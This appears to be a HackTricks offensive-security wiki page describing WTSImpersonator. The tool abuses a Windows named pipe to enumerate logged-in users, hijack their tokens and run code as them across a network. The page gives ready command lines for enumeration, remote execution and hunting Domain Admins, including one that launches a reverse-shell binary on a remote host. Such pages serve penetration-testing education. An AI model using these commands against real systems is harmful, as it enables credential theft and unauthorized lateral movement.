
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

The **WTS Impersonator** tool exploits the **"\\pipe\LSM_API_service"** RPC Named pipe to stealthily enumerate logged-in users and hijack their tokens, bypassing traditional Token Impersonation techniques. This approach facilitates seamless lateral movements within networks. The innovation behind this technique is credited to **Omri Baso, whose work is accessible on [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Core Functionality
The tool operates through a sequence of API calls:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```

### Key Modules and Usage
- **Enumerating Users**: Local and remote user enumeration is possible with the tool, using commands for either scenario:
  - Locally:
    ```powershell
    .\WTSImpersonator.exe -m enum
    ```
  - Remotely, by specifying an IP address or hostname:
    ```powershell  
    .\WTSImpersonator.exe -m enum -s 192.168.40.131  
    ```

- **Executing Commands**: The `exec` and `exec-remote` modules require a **Service** context to function. Local execution simply needs the WTSImpersonator executable and a command:
  - Example for local command execution:
    ```powershell
    .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe  
    ```
  - PsExec64.exe can be used to gain a service context:
    ```powershell
    .\PsExec64.exe -accepteula -s cmd.exe
    ```

- **Remote Command Execution**: Involves creating and installing a service remotely similar to PsExec.exe, allowing execution with appropriate permissions.
  - Example of remote execution:
    ```powershell
    .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
    ```

- **User Hunting Module**: Targets specific users across multiple machines, executing code under their credentials. This is especially useful for targeting Domain Admins with local admin rights on several systems.
  - Usage example:
    ```powershell
    .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe 
    ```


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
